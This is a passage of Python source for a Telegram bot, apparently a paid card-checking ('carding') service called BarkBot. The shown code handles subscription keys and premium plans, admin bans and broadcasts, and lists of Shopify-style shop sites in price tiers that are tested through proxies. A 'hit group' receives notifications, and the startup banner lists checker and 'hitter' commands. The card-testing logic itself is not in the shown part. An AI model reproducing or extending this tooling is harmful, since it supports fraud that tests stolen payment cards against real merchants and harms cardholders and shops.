        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
        f'[⌯] <b>𝗞𝗲𝘆</b> ⌁ <code>{key}</code>\n'
        f'[⌯] <b>𝗣𝗹𝗮𝗻</b> ⌁ <b>{plan}</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
        f'[⌯] <b>𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻</b> ⌁ <b>{days} Days</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
        f'[⌯] <b>𝗠𝗮𝘅 𝗨𝘀𝗲𝘀</b> ⌁ <b>40</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
        f'[⌯] <b>𝗥𝗲𝗱𝗲𝗲𝗺</b> ⌁ <code>/redeem KEY</code> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
        f'[⌯] <b>𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗕𝘆</b> ⌁ {admin_name}'
    )
    await event.reply(premium_emoji(txt), parse_mode='html')

# ============================================================
#  /redeem
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/redeem\s+'))
async def redeem_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    a = event.message.text.split()
    if len(a) < 2: await event.reply(premium_emoji("<code>/redeem KEY</code>"), parse_mode='html'); return
    key = a[1].strip().upper()
    kd = load_json_file(KEYS_FILE, {})
    if key not in kd: await event.reply(premium_emoji("❌ Invalid key!"), parse_mode='html'); return
    if kd[key].get('used_by'): await event.reply(premium_emoji("❌ Used!"), parse_mode='html'); return
    plan = kd[key].get('plan', 'Free')
    days = kd[key].get('days', 30)
    kd[key]['used_by'] = uid
    kd[key]['used_at'] = datetime.now().isoformat()
    kd[key]['used_count'] = kd[key].get('used_count', 0) + 1
    save_json_file(KEYS_FILE, kd)
    set_user_plan(uid, plan, days)
    pu = load_premium_users()
    if str(uid) not in pu:
        with open(PREMIUM_FILE, 'a', encoding='utf-8') as f: f.write(f"{uid}\n")
    user_name = await get_checker_mention(uid)
    creator_name = "Ishanicarder"
    try:
        creator = await bot.get_entity(kd[key].get('created_by'))
        if getattr(creator, 'username', None): creator_name = creator.username
        elif getattr(creator, 'first_name', None): creator_name = creator.first_name
    except: pass
    msg_text = (
        f'[⌯] <b>𝗞𝗲𝘆 𝗥𝗲𝗱𝗲𝗲𝗺𝗲𝗱</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
        f'[⌯] <b>𝗨𝘀𝗲𝗿</b> ⌁ {user_name} ⌁ <code>{uid}</code>\n'
        f'[⌯] <b>𝗣𝗹𝗮𝗻</b> ⌁ <b>{plan}</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
        f'[⌯] <b>𝗘𝘅𝗽𝗶𝗿𝗲𝘀</b> ⌁ <b>{days} Days</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
        f'[⌯] <b>𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗕𝘆</b> ⌁ {creator_name} ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
    )
    await event.reply(premium_emoji(msg_text), parse_mode='html')
    if HIT_GROUP_ID and HIT_GROUP_ID != -1001234567890:
        try:
            await bot.send_message(HIT_GROUP_ID, premium_emoji(msg_text), parse_mode='html', link_preview=False)
        except Exception as e:
            logging.warning(f"Key redeem group notify failed: {e}")

# ============================================================
#  /fb
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/fb\s+'))
async def feedback_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    txt = event.message.text.split(' ',1)[1].strip()
    if not txt: await event.reply(premium_emoji("<code>/fb message</code>"), parse_mode='html'); return
    try:
        s=await event.get_sender()
        un=s.username if s.username else f"user_{uid}"
    except: un=f"user_{uid}"
    fb=load_json_file(FEEDBACK_FILE,[])
    fb.append({'user_id':uid,'username':un,'message':txt,'timestamp':datetime.now().isoformat()})
    save_json_file(FEEDBACK_FILE,fb)
    for aid in ADMIN_IDS:
        try: await bot.send_message(aid,premium_emoji(f"📬 <b>Feedback</b>\n\n@{un}\n<code>{uid}</code>\n{txt}"),parse_mode='html')
        except: pass
    await event.reply(premium_emoji("✅ <b>Feedback sent!</b>"),parse_mode='html')

# ============================================================
#  /stop
# ============================================================
@bot.on(events.NewMessage(pattern='/stop'))
async def stop_command(event):
    uid = event.sender_id
    c = False
    for k in list(active_sessions.keys()):
        if k.startswith(f"{uid}_"): del active_sessions[k]; c = True
    for k in list(whop_sessions.keys()):
        if k.startswith(f"{uid}_"): del whop_sessions[k]; c = True
    for k in list(hitter_sessions.keys()):
        if k.startswith(f"{uid}_"): del hitter_sessions[k]; c = True
    await event.reply(premium_emoji("✅ Stopped!" if c else "❌ None running"), parse_mode='html')

# ============================================================
#  SITE COMMANDS
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/site\b'))
async def site_command(event):
    uid = event.sender_id
    if not is_premium(uid) and not is_admin(uid): return
    await event.reply(
        premium_emoji(
            f'[⌯] <b>𝗔𝗱𝗱 𝗦𝗶𝘁𝗲𝘀</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
            f'<b>Select Price Range:</b>\n'
            f'<i>Sites will be tested. Only alive sites will be added.</i>'
        ),
        buttons=get_site_range_keyboard(),
        parse_mode='html'
    )

@bot.on(events.NewMessage(pattern=r'^/rmsite\s+'))
async def rmsite_command(event):
    uid = event.sender_id
    if not is_premium(uid) and not is_admin(uid): return
    a = event.message.text.split(' ', 2)
    if len(a) < 3:
        await event.reply(premium_emoji("<code>/rmsite 1-5 domain.com</code>"), parse_mode='html'); return
    range_type = a[1].strip()
    site = a[2].strip().replace('https://','').replace('http://','').rstrip('/')
    if range_type == "1-5":
        cur = load_sites_1_5()
        if site not in cur: await event.reply(premium_emoji("Not found in $1-5."), parse_mode='html'); return
        new = [s for s in cur if s != site]
        with open(SITES_1_5_FILE, 'w', encoding='utf-8') as f:
            for s in new: f.write(f"{s}\n")
    elif range_type == "10-20":
        cur = load_sites_10_20()
        if site not in cur: await event.reply(premium_emoji("Not found in $10-20."), parse_mode='html'); return
        new = [s for s in cur if s != site]
        with open(SITES_10_20_FILE, 'w', encoding='utf-8') as f:
            for s in new: f.write(f"{s}\n")
    else:
        await event.reply(premium_emoji("Range must be <code>1-5</code> or <code>10-20</code>"), parse_mode='html'); return
    await event.reply(premium_emoji(f"✅ Removed <code>{site}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/mysites'))
async def mysites_command(event):
    uid = event.sender_id
    if not is_premium(uid) and not is_admin(uid): return
    s1 = load_sites_1_5(); s2 = load_sites_10_20()
    txt = (
        f'<b>Sites 1-5 ({len(s1)}):</b>\n'
        + "\n".join([f"• {s}" for s in s1[:20]]) +
        f'\n\n<b>Sites 10-20 ({len(s2)}):</b>\n'
        + "\n".join([f"• {s}" for s in s2[:20]])
    )
    await event.reply(premium_emoji(txt[:4000]), parse_mode='html')

@bot.on(events.NewMessage(pattern='/sitecheck'))
async def sitecheck_command(event):
    uid = event.sender_id
    if not is_premium(uid) and not is_admin(uid): return
    proxies = load_user_proxies(uid, "shopify")
    if not proxies: await event.reply(premium_emoji("No proxies. Set with /setproxy"), parse_mode='html'); return
    s1 = load_sites_1_5(); s2 = load_sites_10_20()
    allsites = s1 + s2
    if not allsites: await event.reply(premium_emoji("No sites."), parse_mode='html'); return
    sm = await event.reply(premium_emoji(f"🔄 Testing {len(allsites)} sites..."), parse_mode='html')
    alive = []; dead = []
    for site in allsites:
        r = await test_site(site, random.choice(proxies))
        if r['status'] == 'alive': alive.append(site)
        else: dead.append(site)
    await sm.edit(premium_emoji(f"✅ Tested {len(allsites)}\nAlive: {len(alive)}\nDead: {len(dead)}"), parse_mode='html')

# ============================================================
#  SITE ADD HANDLER
# ============================================================
@bot.on(events.NewMessage)
async def site_add_handler(event):
    uid = event.sender_id
    if uid not in pending_site_range: return
    if not event.message.text: return
    if event.message.text.startswith('/'): return
    rng = pending_site_range.get(uid, {}).get("range")
    if not rng: return
    del pending_site_range[uid]
    lines = event.message.text.strip().split('\n')
    sites = []
    for line in lines:
        s = line.strip().replace('https://','').replace('http://','').rstrip('/')
        if s and '.' in s: sites.append(s)
    if not sites:
        await event.reply(premium_emoji("❌ No valid sites."), parse_mode='html'); return
    proxies = load_user_proxies(uid, "shopify")
    if not proxies:
        await event.reply(premium_emoji("❌ Add proxies first with /setproxy"), parse_mode='html'); return
    sm = await event.reply(premium_emoji(f"🔄 Testing {len(sites)} sites...\nPlease wait."), parse_mode='html')
    alive = []; dead = []
    sem = asyncio.Semaphore(10)
    async def test_one(site):
        async with sem:
            r = await test_site(site, random.choice(proxies))
            if r['status'] == 'alive': alive.append(site)
            else: dead.append(site)
    tasks = [asyncio.create_task(test_one(s)) for s in sites]
    await asyncio.gather(*tasks)
    added = 0
    if rng == "1_5":
        cur = load_sites_1_5()
        new_alive = [s for s in alive if s not in cur]
        async with aiofiles.open(SITES_1_5_FILE, 'a') as f:
            for s in new_alive: await f.write(f"{s}\n")
        added = len(new_alive)
    else:
        cur = load_sites_10_20()
        new_alive = [s for s in alive if s not in cur]
        async with aiofiles.open(SITES_10_20_FILE, 'a') as f:
            for s in new_alive: await f.write(f"{s}\n")
        added = len(new_alive)
    result = (
        f'[⌯] <b>𝗦𝗶𝘁𝗲𝘀 𝗔𝗱𝗱𝗲𝗱</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
        f'[⌯] 𝗥𝗮𝗻𝗴𝗲 ⌁ {"$1-5" if rng=="1_5" else "$10-20"}\n'
        f'[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(sites)}\n'
        f'[⌯] ✅ 𝗔𝗹𝗶𝘃𝗲 ⌁ {len(alive)}\n'
        f'[⌯] ❌ 𝗗𝗲𝗮𝗱 ⌁ {len(dead)}\n'
        f'[⌯] ➕ 𝗔𝗱𝗱𝗲𝗱 ⌁ {added}'
    )
    await sm.edit(premium_emoji(result), parse_mode='html')

# ============================================================
#  ADMIN COMMANDS
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/bot\s+(on|off)$'))
async def bot_toggle_command(event):
    if not is_admin(event.sender_id): return
    s = event.message.text.split()[1].lower(); set_bot_status(s)
    await event.reply(premium_emoji(f"{'🟢' if s=='on' else '🔴'} <b>Bot {s.upper()}</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/ban\s+'))
async def ban_command(event):
    if not is_admin(event.sender_id): return
    a = event.message.text.split()
    if len(a) < 2: return
    t = a[1].strip()
    if t in load_banned(): await event.reply(premium_emoji("Already banned."), parse_mode='html'); return
    with open(BANNED_FILE, 'a') as f: f.write(f"{t}\n")
    await event.reply(premium_emoji(f"🚫 <b>{t} banned!</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/unban\s+'))
async def unban_command(event):
    if not is_admin(event.sender_id): return
    a = event.message.text.split()
    if len(a) < 2: return
    t = a[1].strip(); b = load_banned()
    if t not in b: await event.reply(premium_emoji("Not banned."), parse_mode='html'); return
    with open(BANNED_FILE, 'w') as f:
        for x in b:
            if x != t: f.write(f"{x}\n")
    await event.reply(premium_emoji(f"✅ <b>{t} unbanned!</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addpremium'))
async def add_premium_command(event):
    if not is_admin(event.sender_id): return
    a = event.message.text.split()
    if len(a) < 2: return
    t = a[1].strip()
    if t in load_premium_users(): await event.reply(premium_emoji("Already premium."), parse_mode='html'); return
    with open(PREMIUM_FILE, 'a') as f: f.write(f"{t}\n")
    await event.reply(premium_emoji(f"✅ <b>{t} premium!</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/removepremium'))
async def remove_premium_command(event):
    if not is_admin(event.sender_id): return
    a = event.message.text.split()
    if len(a) < 2: return
    t = a[1].strip(); pu = load_premium_users()
    if t not in pu: await event.reply(premium_emoji("Not premium."), parse_mode='html'); return
    with open(PREMIUM_FILE, 'w') as f:
        for u in pu:
            if u != t: f.write(f"{u}\n")
    plans = load_json_file(USER_PLANS_FILE, {})
    if t in plans:
        del plans[t]
        save_json_file(USER_PLANS_FILE, plans)
    await event.reply(premium_emoji(f"✅ <b>{t} removed.</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/broadcast\s+'))
async def broadcast_command(event):
    if not is_admin(event.sender_id): return
    a = event.message.text.split(' ', 1)
    if len(a) < 2: 
        await event.reply(premium_emoji("Usage: <code>/broadcast msg</code>"), parse_mode='html')
        return
    msg = a[1].strip()
    sent = 0
    failed = 0
    user_files = [f for f in os.listdir('.') if f.startswith('user_') and f.endswith('.json')]
    if not user_files:
        await event.reply(premium_emoji("❌ No users found!"), parse_mode='html'); return
    status_msg = await event.reply(premium_emoji(f"📢 Broadcasting to {len(user_files)} users..."), parse_mode='html')
    for f in user_files:
        try:
            u_id = int(f.replace('user_', '').replace('.json', ''))
            await bot.send_message(u_id, premium_emoji(f"📢 <b>Broadcast:</b>\n\n{msg}"), parse_mode='html')
            sent += 1
            await asyncio.sleep(0.1)
        except: failed += 1
    await status_msg.edit(premium_emoji(f"✅ <b>Broadcast Complete!</b>\n\nSent: {sent}\nFailed: {failed}"), parse_mode='html')

# ============================================================
#  STARTUP
# ============================================================
async def auto_add_admins():
    for a in ADMIN_IDS:
        if str(a) not in load_premium_users():
            with open(PREMIUM_FILE, 'a') as f: f.write(f"{a}\n")

if __name__ == "__main__":
    bot.loop.run_until_complete(auto_add_admins())
    print("=" * 50)
    print("✅ BarkBot STARTED!")
    print("🚀 Commands: /sh /msh /sto /msto /whop /jio")
    print("🔑 Key: /key days plan")
    print("🔌 Proxy: /setproxy /myproxy /clearproxy")
    print("📁 Site: /site /rmsite /mysites /sitecheck")
    print("👑 Admin: /admin")
    print("=" * 50)
    bot.run_until_disconnected()
